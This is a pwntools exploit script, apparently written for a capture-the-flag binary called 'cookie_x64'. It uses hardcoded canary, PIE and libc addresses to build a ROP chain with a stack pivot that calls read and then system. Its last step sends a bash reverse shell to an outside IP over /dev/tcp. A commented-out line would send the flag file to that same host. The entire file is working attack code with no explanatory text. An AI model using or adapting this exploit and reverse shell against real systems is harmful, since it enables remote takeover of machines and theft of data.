from pwn import *
context.log_level="debug"

r=remote("127.0.0.1",11003)
elf=ELF("./cookie_x64")
libc=ELF("./x64_libc-2.23.so")

canary=0xbda3dcf33b6b0000
rbp=0x00007ffd61dfa030
pie=0x000055dde2b944ee
base=pie-0x14ee
beginning=rbp-(0x7ffd61dfa030-0x7ffd61df9f90)
leave=base+0xf8c
send=base+0x202058
write=base+0x12D0
mems_got=base+0x202068
bing=base+0x2020B0
p_rdi=base+0x00000000000015a3

libc.address=0x7f620b4cd000
p_rdx=libc.address+0x0000000000001b92
p_rsi=libc.address+0x00000000000202e8

system=libc.sym['system']
read=libc.sym['read']

'''
# get rbp
sh='b'*0x8+'a'*0x40+p64(canary)+p64(rbp)+p64(p_rsi)+p64(rbp-0xa0)+p64(p_rdx)+p64(0x8)+p64(write)
r.recvline()
pause()
r.sendline(sh)
r.recv()
'''

#sh='bash 1>&4 0>&4'+'a'*(0x48-14)+p64(canary)+p64(rbp)+p64(p_rdi)+p64(beginning)+p64(system) 
sh=p64(0)+p64(p_rsi)+p64(0x000055dde2d95800)+p64(p_rdx)+p64(100)+p64(read)+p64(p_rdi)+p64(0x55dde2d95800)+p64(system)+p64(canary)+p64(beginning)+p64(leave)
#sh='a'*0x48+p64(canary)
r.recvline()
pause()
r.sendline(sh)
#r.send('bash 1>&4 0>&4')
sleep(1)
#r.send('bash -c "cat flag > /dev/tcp/10.132.141.62/1234"')
r.send('bash -c "bash -i >& /dev/tcp/10.132.141.62/1234 0>&1"')


r.interactive()
